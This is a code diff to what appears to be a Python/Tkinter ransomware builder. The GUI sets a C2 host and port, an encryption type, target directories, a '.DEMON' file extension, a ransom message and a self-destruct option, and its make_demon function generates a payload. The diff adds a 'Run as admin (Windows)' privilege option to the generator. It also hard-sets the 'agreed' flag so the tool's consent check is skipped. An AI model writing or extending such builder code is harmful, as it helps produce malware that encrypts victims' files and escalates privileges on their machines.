@@ -328,6 +328,7 @@ class MainWindow(Tk):
             'working_dir' : StringVar(),
             'new_working_dir' : StringVar(),
             'remove_payload' : IntVar(),
+            'runas' : IntVar(),
 
             'username' : StringVar(),
             'password' : StringVar(),
@@ -339,7 +340,7 @@ class MainWindow(Tk):
         }
 
 
-        #<activate>
+        self.options['agreed'].set(1)
         #<activate>
 
         if not self.options['agreed'].get() == 1:
@@ -363,6 +364,7 @@ class MainWindow(Tk):
         self.options['debug'].set(0)
         self.options['ext'].set('.DEMON')
         self.options['remove_payload'].set(0)
+        self.options['runas'].set(0)
         self.options['working_dir'].set('$HOME')
 
         self.options['target_dirs'].set('''Downloads
@@ -916,12 +918,6 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         Label(server_frame, text = 'Port:').grid(row = 1, column = 0, sticky = 'w')
         Entry(server_frame, textvariable = self.options['port'], width = 20).grid(row = 1, column = 1)
 
-        options_frame = LabelFrame(self.gen, text = 'Options')
-        options_frame.grid(row = 0, column = 2, sticky = 'nw')
-        Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0, sticky = 'w')
-        Checkbutton(options_frame, text = 'Debug', variable = self.options['debug'], onvalue = 1, offvalue = 0).grid(row = 1, column = 0, sticky = 'w')
-        Checkbutton(options_frame, text = 'Self-destruct', variable = self.options['remove_payload'], onvalue = 1, offvalue = 0).grid(row = 2, column = 0, sticky = 'w')
-
         content_frame = LabelFrame(self.gen, text = 'Content')
         content_frame.grid(row = 1, column = 0, sticky = 'nw')
         set_msg = Button(content_frame, text = 'CUSTOM MESSAGE', command = self.set_msg, width = 25).grid(row = 0, column = 0)
@@ -933,10 +929,18 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         set_dirs = Button(target_frame, text = 'SET TARGET DIRS', command = self.set_dirs, width = 25).grid(row = 0, column = 0)
 
         enc_frame = LabelFrame(self.gen, text = 'Encryption Type')
-        enc_frame.grid(row = 1, column = 2, sticky = 'w')
+        enc_frame.grid(row = 0, column = 2, sticky = 'w')
         Radiobutton(enc_frame, text = 'Ghost (Fastest)', variable = self.options['type'], value = 'ghost').grid(row = 0, column = 0, sticky = 'w')
         Radiobutton(enc_frame, text = 'PyCrypto (Fast)', variable = self.options['type'], value = 'pycrypto').grid(row = 1, column = 0, sticky = 'w')
         Radiobutton(enc_frame, text = 'PyAES (Slow)', variable = self.options['type'], value = 'pyaes').grid(row = 2, column = 0, sticky = 'w')
+
+        options_frame = LabelFrame(self.gen, text = 'Options')
+        options_frame.grid(row = 1, column = 2, sticky = 'nw')
+        Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0, sticky = 'w')
+        Checkbutton(options_frame, text = 'Debug', variable = self.options['debug'], onvalue = 1, offvalue = 0).grid(row = 1, column = 0, sticky = 'w')
+        Checkbutton(options_frame, text = 'Self-destruct', variable = self.options['remove_payload'], onvalue = 1, offvalue = 0).grid(row = 2, column = 0, sticky = 'w')
+        Checkbutton(options_frame, text = 'Run as admin (Windows)', variable = self.options['runas'], onvalue = 1, offvalue = 0).grid(row = 3, column = 0, sticky = 'w')
+
 
         finish_frame = LabelFrame(self.gen, text = 'Finish')
         finish_frame.grid(row = 2, column = 0, columnspan = 1, sticky = 'w')
@@ -1027,7 +1031,6 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
     def make_demon(self):
 
-        print(self.options['working_dir'].get())
         try:
             create_demon(self.options['host'].get(),
                 self.options['port'].get(),
@@ -1041,7 +1044,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 self.options['target_ext'].get(),
                 self.options['target_dirs'].get(),
                 self.options['remove_payload'].get(),
-                self.options['working_dir'].get())
+                self.options['working_dir'].get(),
+                self.options['runas'].get())
         except Exception as e:
             messagebox.showwarning('ERROR', 'Failed to generate payload!\n\n%s' % e)
             return
